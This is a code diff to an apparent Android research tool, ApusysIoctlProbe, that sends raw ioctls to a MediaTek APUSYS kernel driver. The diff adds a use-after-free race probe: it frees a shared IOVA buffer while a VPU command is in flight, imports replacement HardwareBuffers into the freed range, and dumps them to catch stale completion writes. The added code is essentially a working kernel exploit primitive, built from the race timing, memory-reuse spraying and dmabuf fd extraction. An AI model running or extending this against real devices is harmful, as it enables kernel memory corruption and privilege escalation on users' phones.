@@ -42,6 +42,10 @@ public final class ApusysIoctlProbe {
     private static final int OFF_ION_ALLOC   = 0x400;
     private static final int OFF_ION_SHARE   = 0x440;
     private static final int OFF_ION_FREE    = 0x460;
+    private static final int OFF_MEM_REUSE_BASE = 0x500;
+    private static final int OFF_MEM_REUSE_STRIDE = 0x40;
+    private static final int MAX_REUSE_IMPORTS = 4;
+    private static final int REUSE_MARKER_BASE = 0x52555030; // "RUP0"
 
     private static final int RUN_CMD_PAYLOAD_ZERO = 0;
     private static final int RUN_CMD_PAYLOAD_INVALID_SC = 1;
@@ -248,6 +252,62 @@ public final class ApusysIoctlProbe {
         }
     }
 
+    private static final class ReplacementImport {
+        final int index;
+        android.media.ImageReader reader;
+        android.media.ImageWriter writer;
+        android.media.Image input;
+        android.media.Image output;
+        android.hardware.HardwareBuffer hb;
+        long memDesc;
+        int dmaBufFd = -1;
+        int iovaLow;
+        int iovaSize;
+        boolean imported;
+
+        ReplacementImport(int index) {
+            this.index = index;
+        }
+
+        void closeQuietly() {
+            if (hb != null) {
+                try {
+                    hb.close();
+                } catch (Throwable ignored) {
+                }
+                hb = null;
+            }
+            if (output != null) {
+                try {
+                    output.close();
+                } catch (Throwable ignored) {
+                }
+                output = null;
+            }
+            if (input != null) {
+                try {
+                    input.close();
+                } catch (Throwable ignored) {
+                }
+                input = null;
+            }
+            if (writer != null) {
+                try {
+                    writer.close();
+                } catch (Throwable ignored) {
+                }
+                writer = null;
+            }
+            if (reader != null) {
+                try {
+                    reader.close();
+                } catch (Throwable ignored) {
+                }
+                reader = null;
+            }
+        }
+    }
+
     private ApusysIoctlProbe() {
     }
 
@@ -352,6 +412,7 @@ public final class ApusysIoctlProbe {
         boolean runCmdVpuXrpCloseRaceIova = false;
         boolean runCmdVpuXrpMemFreeRaceIova = false;
         boolean runCmdVpuXrpMemFreeRaceCompletedIova = false;
+        boolean runCmdVpuXrpMemFreeRaceCompletedReuseIova = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix = false;
@@ -571,6 +632,8 @@ public final class ApusysIoctlProbe {
                 runCmdVpuXrpMemFreeRaceIova = true;
             } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-iova".equals(arg)) {
                 runCmdVpuXrpMemFreeRaceCompletedIova = true;
+            } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-reuse-iova".equals(arg)) {
+                runCmdVpuXrpMemFreeRaceCompletedReuseIova = true;
             } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot".equals(arg)) {
                 runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = true;
             } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot-control".equals(arg)) {
@@ -707,6 +770,7 @@ public final class ApusysIoctlProbe {
                 || runCmdVpuXrpCloseRaceIova
                 || runCmdVpuXrpMemFreeRaceIova
                 || runCmdVpuXrpMemFreeRaceCompletedIova
+                || runCmdVpuXrpMemFreeRaceCompletedReuseIova
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix
@@ -1276,6 +1340,10 @@ public final class ApusysIoctlProbe {
 
             if (runCmdVpuXrpMemFreeRaceCompletedIova) {
                 runRunCmdVpuXrpMemFreeRaceCompletedHardwareBufferProbe();
+            }
+
+            if (runCmdVpuXrpMemFreeRaceCompletedReuseIova) {
+                runRunCmdVpuXrpMemFreeRaceCompletedReuseHardwareBufferProbe();
             }
 
             if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot) {
@@ -2217,6 +2285,51 @@ public final class ApusysIoctlProbe {
                                                             Integer closeApusysFdAfterAsyncMs,
                                                             Integer freeSharedIovaAfterAsyncMs)
             throws Exception {
+        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
+            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
+            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
+            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
+            codeFirstWordOverride, descriptorPayloadSizeOverride,
+            requestPriorityOverride, requestBufferCountOverride,
+            descriptorPortIdOverride, descriptorFormatOverride,
+            descriptorPlaneCountOverride, descriptorHeightOverride,
+            outerCodebufSizeOverride, dataPayloadWordBaseOverride,
+            dataDescEntriesOverride, fullCommandCopybackDiff,
+            closeApusysFdAfterAsyncMs, freeSharedIovaAfterAsyncMs, 0);
+    }
+
+    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
+                                                            boolean dispatch,
+                                                            boolean xrpSettings,
+                                                            boolean splitTargets,
+                                                            XrpOpSpec xrpOp,
+                                                            int waitMs,
+                                                            boolean twoVpuBuffers,
+                                                            int descriptorMode,
+                                                            int cmdFlags,
+                                                            int descriptorOrder,
+                                                            int settingsLen,
+                                                            int outputHeaderFlag,
+                                                            XrpSettingsShape settingsShape,
+                                                            boolean waitAfterAsync,
+                                                            int requestFlags,
+                                                            boolean includeSettingsProperty,
+                                                            Integer codeFirstWordOverride,
+                                                            Integer descriptorPayloadSizeOverride,
+                                                            Integer requestPriorityOverride,
+                                                            Integer requestBufferCountOverride,
+                                                            Integer descriptorPortIdOverride,
+                                                            Integer descriptorFormatOverride,
+                                                            Integer descriptorPlaneCountOverride,
+                                                            Integer descriptorHeightOverride,
+                                                            Integer outerCodebufSizeOverride,
+                                                            Integer dataPayloadWordBaseOverride,
+                                                            XrpDataDescEntry[] dataDescEntriesOverride,
+                                                            boolean fullCommandCopybackDiff,
+                                                            Integer closeApusysFdAfterAsyncMs,
+                                                            Integer freeSharedIovaAfterAsyncMs,
+                                                            int replacementImportCountAfterFree)
+            throws Exception {
         System.out.println("\n[*] === Optional APUSYS run_cmd VPU IOVA chained probe ===");
         if (xrpSettings) {
             System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
@@ -2365,6 +2478,14 @@ public final class ApusysIoctlProbe {
                     + "ms, mem_free the shared IOVA buffer while the APUSYS fd"
                     + " stays open, keep buffers alive for " + waitMs
                     + "ms, then issue wait_cmd.");
+                if (replacementImportCountAfterFree > 0) {
+                    System.out.println("[*] Reuse-pressure mode: immediately"
+                        + " import up to "
+                        + Math.min(replacementImportCountAfterFree,
+                            MAX_REUSE_IMPORTS)
+                        + " replacement HardwareBuffers after mem_free and"
+                        + " dump them after the completion window.");
+                }
             }
         } else {
             System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
@@ -2387,6 +2508,14 @@ public final class ApusysIoctlProbe {
         boolean memImported = false;
         boolean apusysFdClosedInProbe = false;
         byte[] commandRequestBefore = null;
+        int replacementImportLimit = replacementImportCountAfterFree;
+        if (replacementImportLimit < 0) {
+            replacementImportLimit = 0;
+        }
+        if (replacementImportLimit > MAX_REUSE_IMPORTS) {
+            replacementImportLimit = MAX_REUSE_IMPORTS;
+        }
+        ReplacementImport[] replacementImports = null;
         try {
             reader = createRgbaImageReader(64, 64);
             writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
@@ -2665,6 +2794,19 @@ public final class ApusysIoctlProbe {
                         memDesc, 0x38);
                     if (freeRet >= 0) {
                         memImported = false;
+                        if (replacementImportLimit > 0) {
+                            replacementImports =
+                                new ReplacementImport[replacementImportLimit];
+                            System.out.println("[*] reuse-pressure: importing "
+                                + replacementImportLimit
+                                + " replacement HardwareBuffers after shared"
+                                + " IOVA free");
+                            for (int ri = 0; ri < replacementImportLimit; ri++) {
+                                replacementImports[ri] =
+                                    createReplacementImport(apusysFd, ri,
+                                        iovaLow, iovaSize, xrpOp);
+                            }
+                        }
                     }
                 } else if (closeApusysFdAfterAsyncMs != null && runRet >= 0) {
                     int closeDelayMs = closeApusysFdAfterAsyncMs.intValue();
@@ -2720,6 +2862,14 @@ public final class ApusysIoctlProbe {
                     }
                 }
             }
+            if (replacementImports != null) {
+                System.out.println("[*] Dumping replacement IOVA buffers"
+                    + " post-execution:");
+                for (int ri = 0; ri < replacementImports.length; ri++) {
+                    dumpReplacementImport("after", replacementImports[ri],
+                        iovaLow, xrpOp);
+                }
+            }
             if (freeSharedIovaAfterAsyncMs != null && runRet >= 0
                     && !apusysFdClosedInProbe) {
                 long waitRet = DrmTrigger.rawIoctl(apusysFd,
@@ -2746,6 +2896,12 @@ public final class ApusysIoctlProbe {
 
         } finally {
             // phase 6: cleanup IOVA mem
+            if (replacementImports != null) {
+                for (int ri = 0; ri < replacementImports.length; ri++) {
+                    cleanupReplacementImport(apusysFd, replacementImports[ri],
+                        apusysFdClosedInProbe);
+                }
+            }
             if (memImported) {
                 if (apusysFdClosedInProbe) {
                     System.out.println("[*] close-race: skipping IOVA mem_free"
@@ -3948,6 +4104,45 @@ public final class ApusysIoctlProbe {
         }
     }
 
+    private static void runRunCmdVpuXrpMemFreeRaceCompletedReuseHardwareBufferProbe()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS run_cmd VPU mem-free-race"
+            + " completed-writeback reuse-pressure probe ===");
+        System.out.println("[*] Mode: each case frees the original shared IOVA"
+            + " after async submit, immediately imports same-size replacement"
+            + " HardwareBuffers, then checks whether old completion writes land"
+            + " on a replacement buffer.");
+        int[] freeDelaysMs = {0, 1, 5};
+        for (int delayMs : freeDelaysMs) {
+            runRunCmdVpuXrpMemFreeRaceCompletedReuseCase(delayMs,
+                MAX_REUSE_IMPORTS);
+        }
+    }
+
+    private static void runRunCmdVpuXrpMemFreeRaceCompletedReuseCase(
+            int freeDelayMs, int replacementImportCount) throws Exception {
+        int raceFd = -1;
+        try {
+            raceFd = DrmTrigger.openDev(APUSYS_DEV);
+            System.out.println("\n[*] === mem-free-race completed reuse case:"
+                + " settings5/no-settings ANN_VERSION free_after="
+                + freeDelayMs + "ms replacements=" + replacementImportCount
+                + " post_free_wait=1000ms ===");
+            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
+                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
+                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
+                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
+                XrpSettingsShape.WRAPPER_ONE_DATA, false,
+                VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null, null,
+                null, null, null, null, null, null, null, false, null,
+                Integer.valueOf(freeDelayMs), replacementImportCount);
+        } finally {
+            if (raceFd >= 0) {
+                DrmTrigger.closeFd(raceFd);
+            }
+        }
+    }
+
     private static void runRunCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixProbe(
             int apusysFd, boolean dispatch) throws Exception {
         int[] descriptorModes = {
@@ -4017,6 +4212,160 @@ public final class ApusysIoctlProbe {
                 + shortThrowable(t));
             return android.media.ImageReader.newInstance(
                 width, height, android.graphics.PixelFormat.RGBA_8888, 3);
+        }
+    }
+
+    private static ReplacementImport createReplacementImport(int apusysFd,
+                                                             int index,
+                                                             int originalIova,
+                                                             int originalSize,
+                                                             XrpOpSpec xrpOp)
+            throws Exception {
+        ReplacementImport replacement = new ReplacementImport(index);
+        try {
+            replacement.reader = createRgbaImageReader(64, 64);
+            replacement.writer = android.media.ImageWriter.newInstance(
+                replacement.reader.getSurface(), 2);
+            replacement.input = replacement.writer.dequeueInputImage();
+            fillImageHeader(replacement.input, REUSE_MARKER_BASE + index,
+                "reuse_" + index);
+            replacement.writer.queueInputImage(replacement.input);
+            replacement.input = null;
+
+            replacement.output = acquireImage(replacement.reader);
+            if (replacement.output == null) {
+                throw new IllegalStateException(
+                    "replacement ImageReader produced no image");
+            }
+            replacement.hb = replacement.output.getHardwareBuffer();
+            if (replacement.hb == null) {
+                throw new IllegalStateException(
+                    "replacement HardwareBuffer is null");
+            }
+            replacement.dmaBufFd = extractHardwareBufferDmaBufFd(
+                replacement.hb, "reuse_" + index);
+            if (replacement.dmaBufFd < 0) {
+                throw new IllegalStateException(
+                    "replacement dmabuf fd unavailable");
+            }
+
+            replacement.memDesc = DrmTrigger.sScratchBuf
+                + OFF_MEM_REUSE_BASE + (index * OFF_MEM_REUSE_STRIDE);
+            DrmTrigger.zeroMem(replacement.memDesc, 0x38);
+            DrmTrigger.unsafePutInt(replacement.memDesc + 0x0c, originalSize);
+            DrmTrigger.unsafePutInt(replacement.memDesc + 0x18, 0);
+            DrmTrigger.unsafePutInt(replacement.memDesc + 0x20,
+                replacement.dmaBufFd);
+            long ret = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2,
+                replacement.memDesc);
+            System.out.println("[*] reuse_import[" + index + "] cmd=0x"
+                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
+                + " ret=" + retText(ret));
+            if (ret < 0) {
+                return replacement;
+            }
+
+            replacement.imported = true;
+            replacement.iovaLow = DrmTrigger.unsafeGetInt(
+                replacement.memDesc + 0x08);
+            replacement.iovaSize = DrmTrigger.unsafeGetInt(
+                replacement.memDesc + 0x0c);
+            dumpU32Words("reuse_import_" + index + "_desc",
+                replacement.memDesc, 0x38);
+            System.out.println("[+] reuse_import[" + index + "] iova=0x"
+                + Integer.toHexString(replacement.iovaLow)
+                + " size=0x" + Integer.toHexString(replacement.iovaSize)
+                + " same_as_freed="
+                + (replacement.iovaLow == originalIova ? "1" : "0")
+                + " delta=0x"
+                + Integer.toHexString(replacement.iovaLow - originalIova));
+            dumpReplacementImport("before_wait", replacement, originalIova,
+                xrpOp);
+            return replacement;
+        } catch (Throwable t) {
+            System.out.println("[-] reuse_import[" + index + "] failed: "
+                + shortThrowable(t));
+            replacement.closeQuietly();
+            return replacement;
+        }
+    }
+
+    private static int extractHardwareBufferDmaBufFd(
+            android.hardware.HardwareBuffer hb, String label) throws Exception {
+        android.os.Parcel parcel = android.os.Parcel.obtain();
+        int dmaBufFd = -1;
+        try {
+            hb.writeToParcel(parcel, 0);
+            parcel.setDataPosition(388);
+            android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
+            if (pfd != null) {
+                dmaBufFd = pfd.getFd();
+            }
+        } finally {
+            parcel.recycle();
+        }
+        System.out.println("[+] " + label + " dmabuf fd=" + dmaBufFd);
+        return dmaBufFd;
+    }
+
+    private static void dumpReplacementImport(String phase,
+                                              ReplacementImport replacement,
+                                              int originalIova,
+                                              XrpOpSpec xrpOp) {
+        if (replacement == null || replacement.output == null) {
+            return;
+        }
+        try {
+            android.media.Image.Plane[] planes = replacement.output.getPlanes();
+            if (planes == null || planes.length == 0) {
+                System.out.println("[-] reuse_import[" + replacement.index
+                    + "] " + phase + ": no image planes");
+                return;
+            }
+            java.nio.ByteBuffer buf = planes[0].getBuffer();
+            System.out.println("[*] reuse_import[" + replacement.index + "] "
+                + phase + " iova=0x"
+                + Integer.toHexString(replacement.iovaLow)
+                + " same_as_freed="
+                + (replacement.iovaLow == originalIova ? "1" : "0"));
+            dumpByteBuffer("reuse_" + replacement.index + "_" + phase
+                + "_header", buf, 0x80);
+            dumpXrpWindows("reuse_" + replacement.index + "_" + phase, buf,
+                xrpOp);
+        } catch (Throwable t) {
+            System.out.println("[-] reuse_import[" + replacement.index + "] "
+                + phase + " dump failed: " + shortThrowable(t));
+        }
+    }
+
+    private static void cleanupReplacementImport(int apusysFd,
+                                                 ReplacementImport replacement,
+                                                 boolean apusysFdClosed) {
+        if (replacement == null) {
+            return;
+        }
+        try {
+            if (replacement.imported) {
+                if (apusysFdClosed) {
+                    System.out.println("[*] reuse_import[" + replacement.index
+                        + "] cleanup skipped because APUSYS fd is closed");
+                } else {
+                    long ret = DrmTrigger.rawIoctl(apusysFd,
+                        APUSYS_CMD_MEM_FREE_02, replacement.memDesc);
+                    System.out.println("[*] reuse_import[" + replacement.index
+                        + "] mem_free cmd=0x"
+                        + Long.toHexString(APUSYS_CMD_MEM_FREE_02)
+                        + " ret=" + retText(ret));
+                    if (ret >= 0) {
+                        replacement.imported = false;
+                    }
+                }
+            }
+        } catch (Throwable t) {
+            System.out.println("[-] reuse_import[" + replacement.index
+                + "] cleanup failed: " + shortThrowable(t));
+        } finally {
+            replacement.closeQuietly();
         }
     }
 
